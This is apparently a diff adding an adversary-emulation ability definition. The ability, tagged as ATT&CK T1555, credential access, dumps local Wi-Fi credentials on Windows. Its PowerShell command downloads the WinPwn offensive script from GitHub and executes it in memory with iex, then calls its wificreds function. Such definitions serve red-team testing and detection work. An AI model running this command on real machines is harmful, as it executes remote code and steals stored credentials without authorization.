@@ -1,0 +1,19 @@
+---
+- id: a3c5f576b3c5d4b14da1a3edaafe4a87
+  name: WinPwn - Loot local Credentials - Wifi Credentials
+  description: Loot local Credentials - Wifi Credentials technique via function of
+    WinPwn
+  tactic: credential-access
+  technique:
+    attack_id: T1555
+    name: Credentials from Password Stores
+  platforms:
+    windows:
+      psh:
+        command: iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1');
+          wificreds -consoleoutput -noninteractive
+        payloads: []
+        cleanup: ''
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
